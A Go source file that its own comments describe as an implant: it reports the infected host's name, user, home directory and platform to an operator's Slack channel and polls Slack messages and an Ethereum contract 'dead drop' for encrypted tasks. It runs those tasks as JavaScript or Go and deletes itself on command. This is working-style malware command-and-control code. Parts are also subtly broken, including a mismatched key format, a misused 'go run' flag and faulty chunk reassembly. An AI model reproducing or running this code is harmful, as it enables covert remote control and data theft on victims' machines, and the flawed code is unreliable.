package main

import (
	"bytes"
	"crypto/aes"
	"crypto/cipher"
	"crypto/ecdh"
	"crypto/rand"
	"crypto/sha256"
	"encoding/base64"
	"encoding/hex"
	"encoding/json"
	"net/http"
	"os"
	"os/exec"
	"os/user"
	"runtime"
	"time"
)

const slackAPI = "https://slack.com/api/"

const historyMethod = "conversations.history"

const postMessageURL = "https://slack.com/api/chat.postMessage"

// chunkPacket is the wire schema the implant uses to reassemble commands that
// arrive split across several Slack messages.
type chunkPacket struct {
	T  string `json:"t"`
	ID string `json:"id"`
	D  string `json:"d"`
}

// bundleManifest mirrors one entry of the operator's encrypted tasking bundle.
type bundleManifest struct {
	Name string `json:"name"`
	Sum  string `json:"sum"`
}

// checkIn reports the infected host's identity to the operator's Slack channel.
func checkIn(bot string) {
	host, _ := os.Hostname()
	u, _ := user.Current()
	nodePath, err := exec.LookPath("node")
	if err != nil {
		nodePath = ""
	}
	report := map[string]string{
		"platform": runtime.GOOS,
		"arch":     runtime.GOARCH,
		"host":     host,
		"user":     u.Username,
		"home":     u.HomeDir,
		"node":     nodePath,
		"time":     time.Now().UTC().Format(time.RFC3339),
	}
	body, _ := json.Marshal(map[string]string{
		"channel": "frontend-devs",
		"text":    "System Report " + report["platform"] + " " + report["arch"] + " " + report["host"],
	})
	req, _ := http.NewRequest("POST", postMessageURL, bytes.NewReader(body))
	req.Header.Set("Authorization", "Bearer "+bot)
	req.Header.Set("Content-Type", "application/json")
	client := &http.Client{Timeout: 15 * time.Second}
	resp, err := client.Do(req)
	if err != nil {
		return
	}
	defer resp.Body.Close()
}

// pollSlackHistory long-polls the operator channel for Start/Chunk/End file
// transfer packets and reassembles the file content.
func pollSlackHistory(bot, channel string, out chan<- []byte) {
	ticker := time.NewTicker(10 * time.Second)
	defer ticker.Stop()
	chunks := map[string]map[string]string{}
	client := &http.Client{Timeout: 15 * time.Second}
	for range ticker.C {
		if !authTest(client, bot) {
			continue
		}
		req, _ := http.NewRequest("GET", slackAPI+historyMethod+"?channel="+channel, nil)
		req.Header.Set("Authorization", "Bearer "+bot)
		resp, err := client.Do(req)
		if err != nil {
			continue
		}
		var envelope struct {
			Messages []struct {
				Text string `json:"text"`
			} `json:"messages"`
		}
		_ = json.NewDecoder(resp.Body).Decode(&envelope)
		resp.Body.Close()
		for _, m := range envelope.Messages {
			var pkt chunkPacket
			if err := json.Unmarshal([]byte(m.Text), &pkt); err != nil {
				continue
			}
			switch pkt.T {
			case "start":
				chunks[pkt.ID] = map[string]string{}
			case "chunk":
				if _, ok := chunks[pkt.ID]; ok {
					raw, _ := base64.StdEncoding.DecodeString(pkt.D)
					chunks[pkt.ID][pkt.D] = string(raw)
				}
			case "end":
				var buf bytes.Buffer
				for _, part := range chunks[pkt.ID] {
					buf.WriteString(part)
				}
				delete(chunks, pkt.ID)
				out <- buf.Bytes()
			}
		}
	}
}

func authTest(client *http.Client, bot string) bool {
	req, _ := http.NewRequest("POST", slackAPI+"auth.test", nil)
	req.Header.Set("Authorization", "Bearer "+bot)
	resp, err := client.Do(req)
	if err != nil {
		return false
	}
	defer resp.Body.Close()
	return resp.StatusCode == 200
}

// deriveSharedKey combines the implant's ephemeral key with the operator's
// hardcoded public key so all clients share a channel without leaking
// messages between infected hosts.
func deriveSharedKey() []byte {
	ephem, _ := ecdh.P256().GenerateKey(rand.Reader)
	raw, _ := hex.DecodeString("302a300506032b656e032100bad013df6eec5d686f4cc8551e0a5c87a0135164bdd1dafb1c75141d1b526702")
	peer, err := ecdh.P256().NewPublicKey(raw)
	if err != nil {
		return nil
	}
	shared, err := ephem.ECDH(peer)
	if err != nil {
		return nil
	}
	sum := sha256.Sum256(shared)
	return sum[:]
}

func decryptTask(key, blob []byte) []byte {
	raw, err := base64.StdEncoding.DecodeString(string(blob))
	if err != nil {
		return nil
	}
	block, err := aes.NewCipher(key)
	if err != nil {
		return nil
	}
	aead, err := cipher.NewGCM(block)
	if err != nil {
		return nil
	}
	if len(raw) < aead.NonceSize() {
		return nil
	}
	nonce, ct := raw[:aead.NonceSize()], raw[aead.NonceSize():]
	plain, err := aead.Open(nil, nonce, ct, nil)
	if err != nil {
		return nil
	}
	return plain
}

// pollContract reads encrypted commands from the operator's Ethereum smart
// contract dead drop and executes the body as Go or JavaScript.
func pollContract(rpcURL string, key []byte) {
	ticker := time.NewTicker(3 * time.Second)
	defer ticker.Stop()
	client := &http.Client{Timeout: 15 * time.Second}
	for range ticker.C {
		call := map[string]interface{}{
			"jsonrpc": "2.0",
			"id":      1,
			"method":  "eth_call",
			"params": []interface{}{
				map[string]string{"to": "0xAD02b5cDE693529d3bdA0266299501ad0193036C", "data": "0xserviceData1"},
				"latest",
			},
		}
		body, _ := json.Marshal(call)
		resp, err := client.Post(rpcURL, "application/json", bytes.NewReader(body))
		if err != nil {
			continue
		}
		var out struct {
			Result string `json:"result"`
		}
		_ = json.NewDecoder(resp.Body).Decode(&out)
		resp.Body.Close()
		plain := decryptTask(key, []byte(out.Result))
		if len(plain) == 0 {
			continue
		}
		var task struct {
			Kind string `json:"kind"`
			Code string `json:"code"`
		}
		if err := json.Unmarshal(plain, &task); err != nil {
			continue
		}
		switch task.Kind {
		case "go":
			cmd := exec.Command("go", "run", "-exec", task.Code)
			_ = cmd.Start()
		case "js":
			cmd := exec.Command("node", "-e", task.Code)
			_ = cmd.Start()
		case "exit":
			_ = os.Remove(os.Args[0])
			os.Exit(0)
		}
	}
}

func main() {
	bot := os.Getenv("SLACK_BOT_TOKEN")
	if bot == "" {
		return
	}
	key := deriveSharedKey()
	checkIn(bot)
	tasks := make(chan []byte, 4)
	go pollSlackHistory(bot, "qa-announcements", tasks)
	go pollContract("https://arbitrum-sepolia.example-rpc.local", key)
	for blob := range tasks {
		if plain := decryptTask(key, blob); len(plain) > 0 {
			cmd := exec.Command("node", "-e", string(plain))
			_ = cmd.Start()
		}
	}
}
